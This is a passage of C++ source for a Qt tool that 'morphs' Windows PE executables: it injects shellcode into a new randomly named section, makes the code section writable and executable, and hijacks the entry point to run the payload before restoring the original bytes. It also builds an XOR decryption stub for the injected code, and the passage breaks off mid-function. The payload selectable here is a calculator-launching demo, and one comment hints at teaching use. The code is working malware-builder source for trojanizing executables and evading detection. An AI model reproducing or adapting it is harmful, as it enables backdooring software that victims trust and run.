#include "morph_executable_controller.h"
#include "file_reader.h"
#include "file_saver.h"
#include <stdio.h>

//constructor
Morph_Executable_Controller::Morph_Executable_Controller()
{
    this->cur_wind = MainWindow::getMWptr();
    this->buffer = std::vector<char>();
    this->exe_file_path = QString("");
    this->morphed_exe_name = QString("");
    this->dos_header_pointer = nullptr;
    this->image_NT_header_ptr = nullptr;
    this->image_NT_header_file_cursor = 0;
    this->image_dos_header_file_cursor = 0;
    this->exe_header_file_offset = 0;
    this->entry_point_of_text_section = 0;
    this->file_alignment = 0;
    this->section_alignment = 0;
    this->text_section_raw_data_offset = 0;
    this->text_section_header_ptr = nullptr;
    this->size_of_text_section = 0;
    this->index_of_text_section = 0;
    this->index_of_payload_section = 0;
    this->payload_section_header_ptr = nullptr;
    this->payload_num_of_bytes = 0;
    this->file_alignment_factor = 0;
    this->payload_raw_data_size = 0;
    this->section_alignment_factor = 0;
    this->payload_virtual_size = 0;
    this->payload_raw_address = 0;
    this->payload_virtual_address = 0;
    this->machine_code_num_of_bytes = 0;
    this->starting_of_text_section_offset_on_load = 0;
    this->image_base = 0;
    this->jump_to_payload_byte_length = 0;
    this->text_section_buffer_ptr = nullptr;
    this->text_section_buffer_original = nullptr;
    this->num_of_stosd = 0;
    this->buffer_cursor = 0;
    this->start_of_payload_section_offset = 0;
    this->random_key = 0;
    this->length_to_decrypt = 0;

}

//destructor
Morph_Executable_Controller::~Morph_Executable_Controller()
{

    this->dos_header_pointer = nullptr;
    delete this->dos_header_pointer;

    this->image_NT_header_ptr = nullptr;
    delete this->image_NT_header_ptr;

    this->text_section_header_ptr = nullptr;
    delete this->text_section_header_ptr;

    this->payload_section_header_ptr = nullptr;
    delete this->payload_section_header_ptr;

    delete[] this->text_section_buffer_ptr;

    delete[] this->text_section_buffer_original;

    for(int i = 0; i < this->image_section_header_vec.size(); i++)
    {
        delete this->image_section_header_vec[i];

    }

    this->image_section_header_vec.clear();

    this->cur_wind = nullptr;
    delete this->cur_wind;

}

//morphing section supporting/utility functions
QString Morph_Executable_Controller::read_file_into_vector(QString exe_file_path)
{
    this->exe_file_path = exe_file_path;
    File_Reader reader;
    return reader.read_file_into_vector(exe_file_path,this->buffer);
}

PIMAGE_DOS_HEADER Morph_Executable_Controller::get_ptr_image_dos_header(std::vector<char> &buffer, unsigned int image_dos_header_file_cursor)
{
    char* extracted_dos_header = new char[sizeof(IMAGE_DOS_HEADER)];

    for (int i = 0; i < sizeof(IMAGE_DOS_HEADER); i++)
    {
        extracted_dos_header[i] = buffer[image_dos_header_file_cursor + i];
    }
    return (PIMAGE_DOS_HEADER)extracted_dos_header;
}

QString Morph_Executable_Controller::validate_image_dos_signature(PIMAGE_DOS_HEADER &dos_header_pointer)
{
    if (dos_header_pointer->e_magic == IMAGE_DOS_SIGNATURE)
    {
        return SUCCESS_VALID_DOS_SIGNATURE;
    }

    return ERROR_INVALID_DOS_SIGNATURE;
}

PIMAGE_NT_HEADERS32 Morph_Executable_Controller::get_ptr_image_NT_header(std::vector<char>&buffer, unsigned int image_NT_header_file_cursor)
{
    char *extracted_NT_header = new char[sizeof(IMAGE_NT_HEADERS32)];

    for (int i = 0; i < sizeof(IMAGE_NT_HEADERS32); i++)
    {
        extracted_NT_header[i] = buffer[image_NT_header_file_cursor + i];
    }
    return (PIMAGE_NT_HEADERS32)extracted_NT_header;
}

QString Morph_Executable_Controller::validate_PE_signature(PIMAGE_NT_HEADERS32 &image_NT_header_ptr)
{
    if (image_NT_header_ptr->Signature == IMAGE_NT_SIGNATURE)
    {
        return SUCCESS_VALID_PE_SIGNATURE;
    }

    return ERROR_INVALID_PE_SIGNATURE;
}

std::string Morph_Executable_Controller::randomize_payload_section_name()
{
    srand(time(NULL));
    std::string alpha_num =  "0123456789"; // numbers
    alpha_num +=             "ABCDEFGHIJKLMNOPQRSTUVWXYZ"; // uppercase letters
    alpha_num +=             "abcdefghijklmnopqrstuvwxyz"; // lowercase letters

    //new payload section must start with '.' character
    std::string name = ".";
    // randomization here
    for (int i = 1; i < IMAGE_SIZEOF_SHORT_NAME; i++)
    {
        name += alpha_num[rand() % (alpha_num.length())];
    }

    return name;
}

void Morph_Executable_Controller::store_image_section_headers_in_vec(std::vector<char> &buffer, std::vector<PIMAGE_SECTION_HEADER> &image_section_header_vec,
                                                                     PIMAGE_NT_HEADERS32& image_NT_header_ptr, unsigned int section_header_cursor)
{
    for (int i = 0; i < image_NT_header_ptr->FileHeader.NumberOfSections; i++)
    {
        image_section_header_vec.push_back(get_ptr_image_section_header(buffer, section_header_cursor + i * sizeof(IMAGE_SECTION_HEADER)));
        //printf("Name : %s\n", image_section_header_vec[i]->Name);
    }
}

PIMAGE_SECTION_HEADER Morph_Executable_Controller::get_ptr_image_section_header(std::vector<char> &buffer, unsigned int section_header_cursor)
{
    char *extracted_NT_header = new char[sizeof(IMAGE_SECTION_HEADER)];

    for (int i = 0; i < sizeof(IMAGE_SECTION_HEADER); i++)
    {
        extracted_NT_header[i] = buffer[section_header_cursor + i];
    }

    return (PIMAGE_SECTION_HEADER)extracted_NT_header;
}

QString Morph_Executable_Controller::get_section_header_index_by_name(const std::string section_name, std::vector<PIMAGE_SECTION_HEADER> &image_section_header_vec, PIMAGE_NT_HEADERS32 &image_NT_header_ptr, int &index_of_text_section)
{
    for (int i = 0; i < image_NT_header_ptr->FileHeader.NumberOfSections; i++)
    {
        if (section_name.compare((char*)image_section_header_vec[i]->Name) == 0)
        {
            index_of_text_section = i;
            return SUCCESS_MATCHING_SECTION_HEADER_NAME;
        }
    }
    return ERROR_NO_MATCHING_SECTION_HEADER_NAME;
}

void Morph_Executable_Controller::set_new_section_name(PIMAGE_SECTION_HEADER &payload_section, const std::string payload_section_name)
{
    for(int i = 0; i < payload_section_name.length(); i++)
    {
        payload_section->Name[i] =  payload_section_name[i];
    }
}

int Morph_Executable_Controller::get_payload_radio_button()
{
    QString payload_type = this->cur_wind->get_payload_radio_button();

    for(int i = 0; i < PAYLOADS_VEC.size(); i++)
    {
        if(payload_type == PAYLOADS_VEC[i])
        {
            return i;
        }
    }

    return -1;
}

void Morph_Executable_Controller::calculate_file_alignment_factor(unsigned int &payload_num_of_bytes,
                                                                  DWORD &file_alignment,unsigned int &file_alignment_factor)
{
    file_alignment_factor = payload_num_of_bytes / file_alignment;
    if(payload_num_of_bytes % file_alignment != 0)
    {
        file_alignment_factor++;
    }
}

void Morph_Executable_Controller::calculate_section_alignment_factor(unsigned int &payload_num_of_bytes,
                                                                  DWORD &section_aligment,unsigned int &section_alignment_factor,
                                                                     PIMAGE_SECTION_HEADER &previous_section_header_ptr)
{
    section_alignment_factor = payload_num_of_bytes / section_aligment;
    unsigned int previous_virtual_size = previous_section_header_ptr->Misc.VirtualSize;
    if(previous_virtual_size % section_aligment != 0)
    {
        section_alignment_factor++;
    }
}

void Morph_Executable_Controller::init_payload_section_header(PIMAGE_SECTION_HEADER &payload_section_header_ptr,
                                                              unsigned int &payload_raw_address,
                                                              unsigned int &payload_raw_data_size,
                                                              unsigned int &payload_virtual_address,
                                                              unsigned int &payload_virtual_size,
                                                              DWORD SECTIONCHARACTERISTICSTOSET)
{
    payload_section_header_ptr->PointerToRawData = payload_raw_address;
    payload_section_header_ptr->SizeOfRawData = payload_raw_data_size;
    payload_section_header_ptr->VirtualAddress = payload_virtual_address;
    payload_section_header_ptr->Misc.VirtualSize = payload_virtual_size;
    payload_section_header_ptr->Characteristics = SECTIONCHARACTERISTICSTOSET;
}

//this is to print the relevant information of each section header
//TODO : For e learning, put inside analysis text box or some shit
void Morph_Executable_Controller::print_section_headers(std::vector<PIMAGE_SECTION_HEADER> &image_section_header_vec)
{
    std::cout << "PRINTING IMAGE SECTION HEADERS" << std::endl;
    std::cout << "===============================\n" << std::endl;
    for (auto i = 0; i < image_section_header_vec.size(); i++)
    {
        printf("NAME : %s\n", image_section_header_vec[i]->Name);
        printf("Virtual Size : 0x%x\n", image_section_header_vec[i]->Misc.VirtualSize);
        printf("Virtual Address : 0x%x\n", image_section_header_vec[i]->VirtualAddress);
        printf("Size of Raw Data : 0x%x\n", image_section_header_vec[i]->SizeOfRawData);
        printf("Pointer to Raw Data : 0x%x\n", image_section_header_vec[i]->PointerToRawData);
        printf("Pointer to Relocations : 0x%x\n", image_section_header_vec[i]->PointerToRelocations);
        printf("Pointer to Line Numbers : 0x%x\n", image_section_header_vec[i]->PointerToLinenumbers);
        printf("Number of Relocations: 0x%x\n", image_section_header_vec[i]->NumberOfRelocations);
        printf("Number of Line Numbers: 0x%x\n", image_section_header_vec[i]->NumberOfLinenumbers);
        printf("Charactertistics 0x%x\n", image_section_header_vec[i]->Characteristics);
        printf("-----------------------\n\n");
    }
}

QString Morph_Executable_Controller::asm_to_machine_code(std::string asm_code, std::vector<unsigned char>& machine_code, size_t &machine_code_num_of_bytes)
{
    ks_engine* ks;
    const char* code = asm_code.c_str();
    ks_err err;
    size_t count = 0;
    unsigned char *encode;
    err = ks_open(KS_ARCH_X86, KS_MODE_32, &ks);

    if (err != KS_ERR_OK)
    {
        printf("ERROR: failed on ks_open(), quit\n");
        return ERROR_OPENING_KEYSTONE;
    }
    if (ks_asm(ks, code, 0, &encode, &machine_code_num_of_bytes, &count) != KS_ERR_OK)
    {
        printf("ERROR: ks_asm() failed & count = %lu, error = %u\n",
            count, ks_errno(ks));
        return ERROR_ASSEMBLY_FAILED_KEYSTONE;
    }

    printf("%s = ", code);
    for (int i = 0; i < machine_code_num_of_bytes; i++)
    {
        printf("%02x ", encode[i]);
        machine_code.push_back(encode[i]);
    }
    printf("\n");
    printf("Compiled: %lu bytes, statements: %lu\n", machine_code_num_of_bytes, count);

    // NOTE: free encode after usage to avoid leaking memory
    ks_free(encode);

    // close Keystone instance when done
    ks_close(ks);
    return SUCCESS_ASSEMBLY_TO_MACHINE_CODE_KEYSTONE;

}

char* Morph_Executable_Controller::get_section_data_from_buffer(std::vector <char> &buffer, unsigned int file_offset, unsigned int size_of_section)
{
    char* section = new char[size_of_section];
    for (int i = 0; i < size_of_section; i++)
    {
        section[i] = buffer[file_offset + i];
    }
    return section;
}

void Morph_Executable_Controller::editing_text_section_ptr(char *&text_section_buffer_ptr, unsigned int jump_to_payload_byte_length, DWORD text_section_buffer_offset, std::vector<unsigned char> &machine_code_vec)
{
    //editing the pointer text_section_buffer_ptr to store the jump to payload instruction bytes
    //will be used to put into the actual buffer later
    for(int i = 0; i < jump_to_payload_byte_length; i++)
    {
        *(text_section_buffer_ptr + (text_section_buffer_offset)) = machine_code_vec[i];
        text_section_buffer_ptr++;
    }

}

void Morph_Executable_Controller::calculate_num_of_stosd_for_patching(std::string &text_section_memorized_entry_bytes,
                                                                      unsigned int &num_of_stosd,
                                                                      unsigned int jump_to_payload_byte_length,
                                                                      DWORD starting_of_text_section_offset,
                                                                      std::vector<char> &buffer)
{
    //stosd can only store a certain amount of dwords
    //this is to calculate how many stosd we need
    num_of_stosd = jump_to_payload_byte_length / sizeof(DWORD);
    if(jump_to_payload_byte_length % sizeof(DWORD) != 0)
    {
        num_of_stosd++;
    }

    //storing the original entry bytes from the buffer to text_section_memorized_entry_bytes
    for(int i = 0 ; i < sizeof(DWORD) * num_of_stosd; i++)
    {
        text_section_memorized_entry_bytes += buffer[starting_of_text_section_offset + i];
    }
}

void Morph_Executable_Controller::get_stosd_instruction_asm(std::string &patching_entry_bytes_asm,
                               std::string text_section_memorized_entry_bytes,
                               unsigned int num_of_stosd)
{
    if (text_section_memorized_entry_bytes.length() != 0)
    {
        for (int i = 0; i < num_of_stosd; i++)
        {
            //starting of patching entry bytes asm
            //need to store the original bytes of the text section
            patching_entry_bytes_asm += "mov eax, ";

            std::string big_endian_byte_string = "";
            for (int j = 0; j < sizeof(DWORD); j++)
            {
                if (j % sizeof(DWORD) == 0 && j != 0)
                {
                    //if correct format, no need to use this forloop to convert
                    break;
                }

                //upper and lower nibbles of a byte
                int upper, lower;
                char hex_array[16] = { '0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f' };

                upper = (text_section_memorized_entry_bytes[sizeof(DWORD)*i + j]);
                upper = (upper >> 4) & 0xf;//right shift and to zero off the leading 0s
                lower = text_section_memorized_entry_bytes[sizeof(DWORD)*i + j] & 0xf;//zero off the leading 0s

                //stored as big endian
                big_endian_byte_string += hex_array[upper];
                big_endian_byte_string += hex_array[lower];
            }
            //convert big endian to little endian because its 32 bit
            unsigned long hex_to_convert_to_little_endian = std::stoul(big_endian_byte_string, 0, 16);
            unsigned long hex_upper_lower_to_little_endian = _byteswap_ulong(hex_to_convert_to_little_endian);
            patching_entry_bytes_asm += convert_num_to_hex(hex_upper_lower_to_little_endian) + ";";
            patching_entry_bytes_asm += "stosd;";
        }
    }

}

void Morph_Executable_Controller::populate_section_ptr(char *&section_ptr, char *machine_code,
	unsigned int size_of_machine_code)
{
    for (int i = 0; i < size_of_machine_code; i++)
    {
        *section_ptr = machine_code[i];
        section_ptr++;
    }
}

void Morph_Executable_Controller::populate_payload_vec(std::vector<unsigned char> &payload_vec, const char *payload_shell_code, unsigned int payload_num_of_bytes)
{
    for (int i = 0; i < payload_num_of_bytes; i++)
    {
        payload_vec.emplace_back(payload_shell_code[i]);
    }
}

std::string Morph_Executable_Controller::convert_byte_to_string(char byte)
{
    std::string result = "0x";

    char hex_array[16] = { '0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f' };

    for (int i = 0; i < sizeof(BYTE); i++)
    {
                        //upper and lower nibbles of a byte
        int upper, lower;
        upper = (byte >> 4) & 0xf;//right shift and to zero off the leading 0s
        lower = byte & 0xf;//zero off the leading 0s
        result += hex_array[upper];
        result += hex_array[lower];
    }

    return result;
}

void Morph_Executable_Controller::get_jump_back_to_text_section_instruction_asm(std::string &jump_back_to_text_section_asm, DWORD entry_point_of_text_section)
{
    jump_back_to_text_section_asm = "mov eax, " +
            convert_num_to_hex<DWORD>(entry_point_of_text_section)
            + ";";
    jump_back_to_text_section_asm += "jmp eax;";
}

void Morph_Executable_Controller::rewrite_bytes_to_buffer(std::vector<char> &buffer, char *section_buffer_ptr,
                             unsigned int offset, unsigned int byte_size)
{
    for (int i = 0; i < byte_size; i++)
    {
        buffer[offset + i] = section_buffer_ptr[i];
    }
}

void Morph_Executable_Controller::set_morphed_exe_file_path(QString exe_file_path)
{

    std::string original_exe_file_path = exe_file_path.toStdString().substr(0,exe_file_path.toStdString().find_last_of("/")+1);
    original_exe_file_path += this->morphed_exe_name.toStdString();
    std::cout << original_exe_file_path << std::endl;
    this->morphed_exe_file_path = QString(original_exe_file_path.c_str());
}

void Morph_Executable_Controller::set_morphed_exe_name(QString exe_file_path,std::string modifier)
{
    std::string original_exe_name = exe_file_path.toStdString().substr(exe_file_path.toStdString().find_last_of("/")+1,exe_file_path.length());

    std::size_t symbol = original_exe_name.find_last_of(".");
    std::string exe_name_no_extension = original_exe_name.substr(0,symbol);

    std::string new_exe_name = exe_name_no_extension + modifier + ".exe";
    this->morphed_exe_name = QString(new_exe_name.c_str());
}

void Morph_Executable_Controller::write_exe_file(QString morphed_exe_file_path, std::vector<char> &buffer)
{
    File_Saver saver;
    saver.write_exe_file(morphed_exe_file_path,buffer);
}

void Morph_Executable_Controller::store_edi(std::string &store_payload_entry_point_in_edi_asm, DWORD entry_point_of_text_section)
{
    store_payload_entry_point_in_edi_asm = "mov edi, " + convert_num_to_hex<DWORD>(entry_point_of_text_section) + ";";
}

char Morph_Executable_Controller::generate_random_key()
{
    srand(time(NULL));
    //key must be 0 to 255, max range is FF in hexadecimal
    return rand() % 256;
}

void Morph_Executable_Controller::add_bytes_into_vec(std::vector<unsigned char> &bytes_after_decryption_instructions_vec,
                                                     std::vector<unsigned char> machine_code_vec)
{
    for(int i = 0; i < machine_code_vec.size(); i++)
    {
        bytes_after_decryption_instructions_vec.emplace_back(machine_code_vec[i]);
    }
}

void Morph_Executable_Controller::encrypt_bytes_after_decryption_instruction_vec(std::vector<unsigned char> &bytes_after_decryption_instructions_vec,
                                                                                 char random_key)
{
    for(int i = 0; i < bytes_after_decryption_instructions_vec.size(); i++)
    {
        bytes_after_decryption_instructions_vec[i] = bytes_after_decryption_instructions_vec[i] ^ random_key;
    }
}

void Morph_Executable_Controller::get_decryption_asm(std::string &decrypt_asm,
                                                     DWORD start_of_payload_section_offset,
                                                     unsigned int length_of_random_key,
                                                     std::vector<unsigned char> &machine_code_vec,
                                                     size_t &machine_code_num_of_bytes,
                                                     unsigned int size_of_bytes_after_decryption_instructions_vec)
{
    std::string decrypt_first_half_temp = "mov ecx, dword ptr[" +
            convert_num_to_hex<DWORD>(start_of_payload_section_offset) +"];"; // this is to obtain the random key

    decrypt_first_half_temp += "xor ebx, ebx;";
    //this line will contain arbitrary address, will just be used to calculate the length of the
    //whole decryption function, note that this instructions will not actually be injected
    decrypt_first_half_temp += "mov eax, " + convert_num_to_hex<DWORD>(start_of_payload_section_offset)+ ";";
    machine_code_vec.clear();

    //once again this is arbitrary, we just need the length of the first half of the
    //decryption function, note that this instructions will not actually be injected
    asm_to_machine_code(decrypt_first_half_temp,machine_code_vec,machine_code_num_of_bytes);

    unsigned int length_of_first_half = machine_code_num_of_bytes;

    std::string decrypt_second_half = "xor byte ptr [eax], cl;" ; // start decrypting from address of encrypted bytes, stored in eax
    decrypt_second_half += "inc ebx;"; // increase ebx, this acts as a counter
    decrypt_second_half += "inc eax;"; // increase eax, this adds the address + 1, this is to traverse the encrypted bytes
    decrypt_second_half += "cmp ebx, " +
            convert_byte_to_string(size_of_bytes_after_decryption_instructions_vec) +
            ";"; // this is the length of the total encrypted bytes, compares the counter with this, if it reaches, will stop "looping"

    machine_code_vec.clear();

    asm_to_machine_code(decrypt_second_half,machine_code_vec,machine_code_num_of_bytes);

    //getting the length of the second half, this does not include the jne instruction yet
    unsigned int length_of_second_half = machine_code_num_of_bytes;

    //this is the total length of the decryption function
    unsigned int length_of_decryption_function = length_of_first_half + length_of_second_half;

    //TODO, the JNE, for now the jne length is hard coded


    decrypt_asm = "mov ecx, dword ptr[" +
            convert_num_to_hex<DWORD>(start_of_payload_section_offset) +"];";//this is to obtain the random key, which is at the first offset
    decrypt_asm += "xor ebx, ebx;"; // ebx acts as a counter
    decrypt_asm += "mov eax, " + convert_num_to_hex<DWORD>(start_of_payload_section_offset +
                                                           length_of_decryption_function +
                                                           length_of_random_key +
                                                           (sizeof(BYTE) * 2)) + ";";//jne opcode + backwards jump opcode
                                                                                     //each is 1 byte, hence total is 2 bytes
	decrypt_asm += decrypt_second_half;
	
	machine_code_vec.clear();

    asm_to_machine_code(decrypt_asm,machine_code_vec,machine_code_num_of_bytes);

    calculate_jne_short_backwards(machine_code_vec,length_of_second_half, machine_code_num_of_bytes);
}

void Morph_Executable_Controller::calculate_jne_short_backwards(std::vector<unsigned char> &machine_code_vec,unsigned int length_of_jne,
																size_t &machine_code_num_of_bytes)
{
    //most efficient offsets are in this range, -128 to 127, in twos complement, binary
    //must be signed
    if(length_of_jne <= 128 && length_of_jne > 0)
    {
        machine_code_vec.emplace_back('\x75');
        //because the jne must start from the last 2 bytes
        //opcode of the JNE and the byte to jump to is 2 bytes
        length_of_jne += 2;

        // 2s complement
        length_of_jne = length_of_jne ^ 0xFF;
        length_of_jne += 1;
		std::string bytes = convert_byte_to_string(length_of_jne);
		machine_code_vec.emplace_back((BYTE)length_of_jne);
		machine_code_num_of_bytes += 2; // this is because we emplaced back 2 opcodes
    }
}

void Morph_Executable_Controller::add_random_key_to_payload_section_buffer_ptr(char *&payload_section_buffer_ptr, char random_key)
{
    *payload_section_buffer_ptr = random_key;
    payload_section_buffer_ptr++;
}

void Morph_Executable_Controller::error_warning_message_box(QString status)
{
    if (status == ERROR_INVALID_EXECUTABLE)
    {
        QMessageBox::warning(cur_wind, "Warning",
                             "Invalid exe file: " + this->exe_file_path);
    }
    else if (status == ERROR_INVALID_DOS_SIGNATURE)
    {
        QMessageBox::warning(cur_wind, "Warning",
                             "Invalid DOS Signature");
    }
    else if (status == ERROR_INVALID_PE_SIGNATURE)
    {
        QMessageBox::warning(cur_wind, "Warning",
                             "Invalid PE Signature");
    }
    else if (status == ERROR_NO_MATCHING_SECTION_HEADER_NAME)
    {
        QMessageBox::warning(cur_wind, "Warning",
                             "No matching section header name for \".text\"");
    }
    else if (status == ERROR_NO_MATCHING_SECTION_HEADER_NAME)
    {
        QMessageBox::warning(cur_wind, "Warning",
                             "No matching section header name for \".payload\"");
    }
    else if(status == ERROR_OPENING_KEYSTONE)
    {
        QMessageBox::warning(cur_wind, "Warning",
                             "Error opening keystone");
    }
    else if (status == ERROR_ASSEMBLY_FAILED_KEYSTONE)
    {
        QMessageBox::warning(cur_wind, "Warning",
                             "Failed to assemble in keystone");
    }
}

QString Morph_Executable_Controller::morph_exe_no_encryption(QString exe_file_path)
{
    QString status = "";
    //reading bytes of a exe file
    status = read_file_into_vector(exe_file_path);
    error_warning_message_box(status);

    //get image dos header pointer
    //image_dos_header_file_cursor is at offset 0 as this pe header is located at the first offset of the exe
    this->dos_header_pointer = get_ptr_image_dos_header(this->buffer,this->image_dos_header_file_cursor);

    //validate the image dos header must be equals to MZ(ASCII)
    status = validate_image_dos_signature(dos_header_pointer);
    error_warning_message_box(status);


    // getting image_NT_header_cursor and setting exe_header_file_offset
    // Here we are assuming that buffer has the same bytes as the original file
    // so we need to get the exe_header_file_offset
    // which is the value of the e_lfanew attribute in dos_header_pointer
    this->image_NT_header_file_cursor = this->dos_header_pointer->e_lfanew;
    this->exe_header_file_offset = this->image_NT_header_file_cursor;

    // get the image_NT_header_ptr
    // the offset is at e_lfanew which is stored in image_NT_header_file_cursor
    this->image_NT_header_ptr = get_ptr_image_NT_header(this->buffer,image_NT_header_file_cursor);

    //validate the file PE signature must be equal to some dog shit
    status = validate_PE_signature(image_NT_header_ptr);
    error_warning_message_box(status);


    printf("Before: Number of Sections : 0x%x\n", this->image_NT_header_ptr->FileHeader.NumberOfSections);
    //increasing the number of sections to allocate memory for payload
    this->image_NT_header_ptr->FileHeader.NumberOfSections += 1;
    printf("After: Number of Sections : 0x%x\n", this->image_NT_header_ptr->FileHeader.NumberOfSections);

    //randomizing the new payload section name
    const std::string payload_section_name = randomize_payload_section_name();


     //this is the entry point when the pe file is loaded to virtual memory
    //must add image base + the address of entry point
    this->entry_point_of_text_section = this->image_NT_header_ptr->OptionalHeader.ImageBase + this->image_NT_header_ptr->OptionalHeader.AddressOfEntryPoint;
    printf("ImageBase : 0x%x\nLoaded Entry point : 0x%x\n", this->image_NT_header_ptr->OptionalHeader.ImageBase, this->entry_point_of_text_section);

    //saving the file and section alignments in variables
    this->file_alignment =this->image_NT_header_ptr->OptionalHeader.FileAlignment;
    this->section_alignment = this->image_NT_header_ptr->OptionalHeader.SectionAlignment;

    // This cursor will be used to cycle through each section in the pe file
    // need to add exe file offset + the size of an IMAGE_NT_HEADERS32 struct to get to the first section
    unsigned int section_header_cursor = exe_header_file_offset + sizeof(IMAGE_NT_HEADERS32);

    //storing all image section headers inside a vector
    store_image_section_headers_in_vec(buffer, image_section_header_vec,
                                       image_NT_header_ptr, section_header_cursor);

    //getting the index of the .text section inside the image_section_header_vec
    status = get_section_header_index_by_name(TEXT_SECTION_NAME, image_section_header_vec,image_NT_header_ptr,index_of_text_section);
    error_warning_message_box(status);

    //getting the raw data offset of the .text section via image_section_header_vec
    //note that the above function saved the index of the .text section
    this->text_section_raw_data_offset = this->image_section_header_vec[this->index_of_text_section]->PointerToRawData;

    //storing the whole .text section inside the text_section_header_ptr
    this->text_section_header_ptr = this->image_section_header_vec[this->index_of_text_section];

    //getting the raw data size of the .text section via text_section_header_ptr
    this->size_of_text_section = this->text_section_header_ptr->SizeOfRawData;

    //setting the characteristics to read/write/execute
    this->text_section_header_ptr->Characteristics = SECTIONCHARACTERISTICSTOSET;

    //setting the payload section name from payload_section_name (randomized earlier),
    //which is at the end of the image_section_header_vec
    set_new_section_name(this->image_section_header_vec[this->image_section_header_vec.size()-1],
                           payload_section_name);


    //getting the index of the .payload section inside the image_section_header_vec
    status = get_section_header_index_by_name(payload_section_name, image_section_header_vec,
                                              image_NT_header_ptr,index_of_payload_section);
    error_warning_message_box(status);

    //storing the whole .payload section inside the payload_section_header_ptr
    this->payload_section_header_ptr = image_section_header_vec[index_of_payload_section];

    //gets the index corresponding to the radio button
    int chosen_payload_index = get_payload_radio_button();


    switch(chosen_payload_index)
    {
        case 0:
            set_morphed_exe_name(exe_file_path,"_CALC");
            this->payload_num_of_bytes = sizeof(CALC_SHELLCODE) - 1; //the -1 is to get rid of terminating character
            populate_payload_vec(this->payload_vec,CALC_SHELLCODE,this->payload_num_of_bytes);
            break;

        default:
            break;
    }

    //setting the full file path
    set_morphed_exe_file_path(exe_file_path);

    //calculate the file alignment factor to align the section
    calculate_file_alignment_factor(this->payload_num_of_bytes,this->file_alignment,this->file_alignment_factor);

    //calculate the payload raw data size via file_alignment
    this->payload_raw_data_size = this->file_alignment_factor * this->file_alignment;

    //calculate the section alignment factor for the section
    //needs the virtual size of the section before the payload section for calculation
    calculate_section_alignment_factor(payload_num_of_bytes,section_alignment,section_alignment_factor,
                                       image_section_header_vec[index_of_payload_section-1]);

    //calculate payloads virtual size via section alignment
    this->payload_virtual_size = this->section_alignment_factor * this->section_alignment;

    //calculate payloads raw address
    //previous raw size + previous raw data offset
    this->payload_raw_address = image_section_header_vec[index_of_payload_section-1]->SizeOfRawData
                                + image_section_header_vec[index_of_payload_section-1]->PointerToRawData;

    //calculate the payloads va
    //previous virtual address + payloads virtual size
    this->payload_virtual_address = image_section_header_vec[index_of_payload_section-1]->VirtualAddress
                                    + this->payload_virtual_size;

    //setting the relevant values in the new payload section header via payload_section_header_ptr
    init_payload_section_header(this->payload_section_header_ptr,
                                this->payload_raw_address,
                                this->payload_raw_data_size,
                                this->payload_virtual_address,
                                this->payload_virtual_size,
                                this->SECTIONCHARACTERISTICSTOSET);

    //setting the new size of the pe file
    //via image_NT_header_ptr by adding on the payload_virtual_size
    this->image_NT_header_ptr->OptionalHeader.SizeOfImage += this->payload_virtual_size;

    //this is the section pivot gadget for the payload section,
    //which is used to patch back the .text section
    //currently this value is when the PE is loaded, hence we add the raw data offset of the text section
    this->starting_of_text_section_offset_on_load = this->image_NT_header_ptr->OptionalHeader.AddressOfEntryPoint -
                                    this->image_NT_header_ptr->OptionalHeader.BaseOfCode +
                                    this->text_section_raw_data_offset;

    //getting image base via image_NT_header_ptr optional header
    this->image_base = this->image_NT_header_ptr->OptionalHeader.ImageBase;

    //getting the start of the payload section, which is image base + payload virtual size
    this->start_of_payload_section_offset = this->image_base + this->payload_virtual_address;

    //writing assembly syntax, for jumping to payload section (section pivot gadget), into string
    std::string jump_to_payload_asm = "mov ecx, ";
    jump_to_payload_asm += convert_num_to_hex<DWORD>(this->start_of_payload_section_offset) + ";";
    jump_to_payload_asm += "jmp ecx;";
    this->machine_code_vec.clear(); //clear vector to input new machine code

    //and converting assembly syntax into machine code
    status = asm_to_machine_code(jump_to_payload_asm,this->machine_code_vec,this->machine_code_num_of_bytes);
    error_warning_message_box(status);

    //storing the byte length of the section pivot gadget
    this->jump_to_payload_byte_length = this->machine_code_num_of_bytes;

    //putting original text section data into a pointer, to be added into the buffer later
    this->text_section_buffer_original = get_section_data_from_buffer(this->buffer,
                                                                      this->text_section_raw_data_offset,
                                                                      this->size_of_text_section);
    //storing the original text section into a pointer, for calculation
    this->text_section_buffer_ptr = this->text_section_buffer_original;


    //editing the pointer text_section_buffer_ptr to store the jump to payload instruction bytes
    //will be used to put into the actual buffer later
    //starting_of_text_section_offset_on_load must subtract by the text_section_raw_data_offset
    //to get to the physical memory of the buffer
    editing_text_section_ptr(this->text_section_buffer_ptr,
                             this->jump_to_payload_byte_length,
                             this->starting_of_text_section_offset_on_load - this->text_section_raw_data_offset,
                             this->machine_code_vec);


    //stores the payload into a variable char* and the ptr is to do calculation
    char *payload_section_buffer_original = new char [this->payload_raw_data_size];
    char *payload_section_buffer_ptr = payload_section_buffer_original;

    //we need to store the payload entry point address into edi, so that stosd will work as intended
    //safe practice, incase edi was used or modified previously
    std::string store_payload_entry_point_in_edi_asm = "";
    store_edi(store_payload_entry_point_in_edi_asm,this->entry_point_of_text_section);
    this->machine_code_vec.clear();
    asm_to_machine_code(store_payload_entry_point_in_edi_asm,
                        this->machine_code_vec,this->machine_code_num_of_bytes);

    populate_section_ptr(payload_section_buffer_ptr,
                                reinterpret_cast<char*>(this->machine_code_vec.data()),
                                this->machine_code_num_of_bytes);


    //here we memorize the original bytes of the text section
    //this will be used in the payload section to patch back the overwritten text section bytes
    std::string text_section_memorized_entry_bytes = "";

    //stosd can only store a certain amount of dwords
    //this is to calculate how many stosd we need
    //storing the original entry bytes from the buffer to text_section_memorized_entry_bytes
    calculate_num_of_stosd_for_patching(text_section_memorized_entry_bytes,
                                        this->num_of_stosd,
                                        this->jump_to_payload_byte_length,
                                        this->starting_of_text_section_offset_on_load,
                                        this->buffer);



    //getting the stosd instructions asm, afew calculations must be done for big to little endian conversion
    std::string patching_entry_bytes_asm = "";
    get_stosd_instruction_asm(patching_entry_bytes_asm,
                              text_section_memorized_entry_bytes,
                              this->num_of_stosd);

    //converting patching_entry_bytes_asm to machine code
    this->machine_code_vec.clear();
    asm_to_machine_code(patching_entry_bytes_asm,this->machine_code_vec,
                        this->machine_code_num_of_bytes);


    //writing the machine code into payload_section_buffer_ptr
    //this will be used later to write back to the buffer
    populate_section_ptr(payload_section_buffer_ptr,
                                reinterpret_cast<char*>(this->machine_code_vec.data()),
                                this->machine_code_num_of_bytes);

    //putting in the payload into payload_section_buffer_ptr
    populate_section_ptr(payload_section_buffer_ptr,
